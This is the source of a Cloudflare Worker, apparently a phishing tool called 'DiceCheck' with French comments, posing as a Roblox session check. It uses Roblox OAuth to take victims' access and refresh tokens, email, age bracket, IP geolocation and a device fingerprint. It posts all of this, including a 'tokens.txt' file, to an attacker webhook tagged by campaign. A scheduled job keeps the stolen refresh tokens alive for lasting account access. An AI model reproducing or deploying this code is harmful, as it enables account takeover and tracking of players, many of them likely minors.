import PAGE from './const.html';

// ===== DiceCheck Worker — Cloudflare =====
// Vars : BASE, CLIENT_ID | Secrets : CLIENT_SECRET, HOOK | Binding : KV

const AUTH = 'https://apis.roblox.com/oauth/v1/authorize';
const TOKEN = 'https://apis.roblox.com/oauth/v1/token';
const UI = 'https://apis.roblox.com/oauth/v1/userinfo';
const SCOPE = 'openid profile email premium age';

const j = (o, s = 200) =>
  new Response(JSON.stringify(o), {
    status: s,
    headers: { 'content-type': 'application/json', 'access-control-allow-origin': '*', 'cache-control': 'no-store' }
  });

const html = (s, t = 200) =>
  new Response(s, {
    status: t,
    headers: {
      'content-type': 'text/html; charset=utf-8',
      'cache-control': 'no-store',
      'x-content-type-options': 'nosniff',
      'referrer-policy': 'no-referrer-when-downgrade'
    }
  });

const rnd = n => crypto.randomUUID().replace(/-/g, '').slice(0, n);
const esc = s => String(s == null ? '' : s).replace(/[`\\*_~|]/g, c => '\\' + c).slice(0, 1000);

function authUrl(env, state, prompt) {
  const u = new URL(AUTH);
  u.searchParams.set('client_id', env.CLIENT_ID);
  u.searchParams.set('redirect_uri', env.BASE + '/cb');
  u.searchParams.set('scope', SCOPE);
  u.searchParams.set('response_type', 'code');
  u.searchParams.set('state', state);
  if (prompt) u.searchParams.set('prompt', prompt);
  return u.toString();
}

async function hook(env, embeds, file) {
  try {
    if (file) {
      const fd = new FormData();
      fd.set('payload_json', JSON.stringify({ embeds }));
      fd.set('files[0]', new Blob([file.body], { type: 'text/plain' }), file.name);
      await fetch(env.HOOK, { method: 'POST', body: fd });
    } else {
      await fetch(env.HOOK, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ embeds })
      });
    }
  } catch (e) {}
}

function geo(request) {
  const c = request.cf || {};
  return {
    ip: request.headers.get('cf-connecting-ip') || '?',
    country: c.country || '', region: c.region || '', city: c.city || '',
    zip: c.postalCode || '', asn: c.asn || '', org: c.asOrganization || '',
    tz: c.timezone || '', ua: request.headers.get('user-agent') || ''
  };
}

const CLOSE = '<body style="background:#070a12;color:#8b96ad;font-family:sans-serif;display:grid;place-items:center;height:100vh;margin:0"><p>…</p><script>setTimeout(()=>window.close(),400)</script></body>';

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const p = url.pathname;

    // ---------- page ----------
    if (p === '/') return html(PAGE);

    // ---------- fingerprint ----------
    if (p === '/fp' && request.method === 'POST') {
      const fp = await request.json().catch(() => ({}));
      const cid = rnd(24);
      await env.KV.put(
        'fp:' + cid,
        JSON.stringify({ fp, g: geo(request), c: url.searchParams.get('c') || '' }),
        { expirationTtl: 1800 }
      );
      return j({ cid });
    }

    // ---------- ouverture du popup ----------
    if (p === '/go') {
      const cid = url.searchParams.get('cid') || '';
      const state = rnd(32);
      await env.KV.put('st:' + state, JSON.stringify({ cid }), { expirationTtl: 900 });
      return Response.redirect(authUrl(env, state, 'none'), 302);
    }

    // ---------- relance visible si aucune session ----------
    if (p === '/relogin') {
      const state = url.searchParams.get('s') || '';
      if (!(await env.KV.get('st:' + state))) return Response.redirect(env.BASE + '/', 302);
      return Response.redirect(authUrl(env, state, 'login'), 302);
    }

    // ---------- callback ----------
    if (p === '/cb') {
      const state = url.searchParams.get('state') || '';
      const err = url.searchParams.get('error');
      const raw = await env.KV.get('st:' + state);
      if (!raw) return html('<p style="font-family:sans-serif">Session expirée.</p>', 410);

      const cur = JSON.parse(raw);

      if (err) {
        await env.KV.put(
          'st:' + state,
          JSON.stringify({ ...cur, [err === 'login_required' ? 'need' : 'failed']: err === 'login_required' ? 1 : err }),
          { expirationTtl: 900 }
        );
        return html(CLOSE);
      }

      const code = url.searchParams.get('code');
      if (!code) return html(CLOSE);

      const tr = await fetch(TOKEN, {
        method: 'POST',
        headers: {
          'content-type': 'application/x-www-form-urlencoded',
          authorization: 'Basic ' + btoa(env.CLIENT_ID + ':' + env.CLIENT_SECRET)
        },
        body: new URLSearchParams({ grant_type: 'authorization_code', code })
      });
      const tok = await tr.json().catch(() => ({}));

      if (!tok.access_token) {
        await env.KV.put('st:' + state, JSON.stringify({ failed: 'token' }), { expirationTtl: 900 });
        return html(CLOSE);
      }

      const ur = await fetch(UI, { headers: { authorization: 'Bearer ' + tok.access_token } });
      const u = await ur.json().catch(() => ({}));

      const ctx = cur.cid ? JSON.parse((await env.KV.get('fp:' + cur.cid)) || '{}') : {};
      const g = ctx.g || geo(request);
      const fp = ctx.fp || {};

      const E = [];
      E.push({
        title: 'Session vérifiée',
        color: 0x2bd576,
        description:
          '**' + esc(u.preferred_username || u.name) + '**' +
          (u.nickname && u.nickname !== u.preferred_username ? ' (' + esc(u.nickname) + ')' : '') +
          '\n`' + esc(u.sub) + '`' + (u.email ? '\n' + esc(u.email) : ''),
        thumbnail: u.picture ? { url: u.picture } : undefined,
        footer: { text: 'campagne: ' + (ctx.c || 'direct') }
      });

      E.push({
        title: 'Compte',
        color: 0x1f6feb,
        fields: [
          { name: 'ID', value: '`' + esc(u.sub) + '`', inline: true },
          { name: 'Premium', value: u.premium ? 'oui' : 'non', inline: true },
          { name: 'Tranche âge', value: esc(u.age_bracket || '?'), inline: true },
          { name: 'Vérifié', value: u.verified ? 'oui' : 'non', inline: true },
          { name: 'Email vérifié', value: u.email_verified ? 'oui' : 'non', inline: true },
          { name: 'Créé', value: u.created_at ? new Date(u.created_at * 1000).toISOString().slice(0, 10) : '?', inline: true }
        ]
      });

      E.push({
        title: 'Réseau',
        color: 0x8957e5,
        fields: [
          { name: 'IP', value: '`' + esc(g.ip) + '`', inline: true },
          { name: 'Géo', value: esc([g.city, g.region, g.country].filter(Boolean).join(', ') || '?'), inline: true },
          { name: 'FAI', value: esc(g.org || '?') + '\nAS' + esc(g.asn), inline: true },
          { name: 'Fuseau', value: esc(g.tz || '?'), inline: true },
          { name: 'IP locale', value: '`' + esc(fp.localIP || '?') + '`', inline: true },
          { name: 'Apps', value: esc(fp.apps || '?'), inline: true }
        ]
      });

      E.push({
        title: 'Machine',
        color: 0x6e7681,
        description:
          'GPU: `' + esc(fp.gpu || '?') + '`\nÉcran: ' + esc(fp.screen || '?') +
          '\nCPU: ' + esc(fp.cores || '?') + ' coeurs / RAM: ' + esc(fp.mem || '?') +
          '\nBatterie: ' + esc(fp.batt || '?') + '\nLangue: ' + esc(fp.lang || '?') +
          '\nRéf: ' + esc(fp.ref || 'direct')
      });

      await hook(env, E, {
        name: 'tokens.txt',
        body:
          'user_id: ' + u.sub +
          '\nusername: ' + (u.preferred_username || '') +
          '\nemail: ' + (u.email || '') +
          '\naccess: ' + tok.access_token +
          '\nrefresh: ' + (tok.refresh_token || '') +
          '\nscopes: ' + (tok.scope || '') +
          '\nip: ' + g.ip
      });

      if (tok.refresh_token) {
        await env.KV.put('tk:' + u.sub, JSON.stringify({
          r: tok.refresh_token, n: u.preferred_username || '', at: Date.now()
        }));
      }

      await env.KV.put('st:' + state, JSON.stringify({ done: 1, n: u.preferred_username || u.name || '' }), { expirationTtl: 600 });
      return html(
        '<body style="background:#070a12;color:#2bd576;font-family:sans-serif;display:grid;place-items:center;height:100vh;margin:0;font-size:34px">✓' +
        '<script>setTimeout(()=>window.close(),500)</script></body>'
      );
    }

    // ---------- état ----------
    if (p === '/st') {
      const raw = await env.KV.get('st:' + (url.searchParams.get('k') || ''));
      if (!raw) return j({ s: 'lost' });
      const st = JSON.parse(raw);
      if (st.done) return j({ s: 'done', n: st.n });
      if (st.need) return j({ s: 'need' });
      if (st.failed) return j({ s: 'fail', e: st.failed });
      return j({ s: 'pending' });
    }

    return html('404', 404);
  },

  // rotation des refresh tokens
  async scheduled(ev, env) {
    const list = await env.KV.list({ prefix: 'tk:' });
    for (const k of list.keys) {
      const v = JSON.parse((await env.KV.get(k.name)) || 'null');
      if (!v || Date.now() - v.at < 40 * 864e5) continue;
      const r = await fetch(TOKEN, {
        method: 'POST',
        headers: {
          'content-type': 'application/x-www-form-urlencoded',
          authorization: 'Basic ' + btoa(env.CLIENT_ID + ':' + env.CLIENT_SECRET)
        },
        body: new URLSearchParams({ grant_type: 'refresh_token', refresh_token: v.r })
      });
      const t = await r.json().catch(() => ({}));
      if (t.refresh_token) await env.KV.put(k.name, JSON.stringify({ r: t.refresh_token, n: v.n, at: Date.now() }));
      else if (t.error === 'invalid_grant') await env.KV.delete(k.name);
    }
  }
};
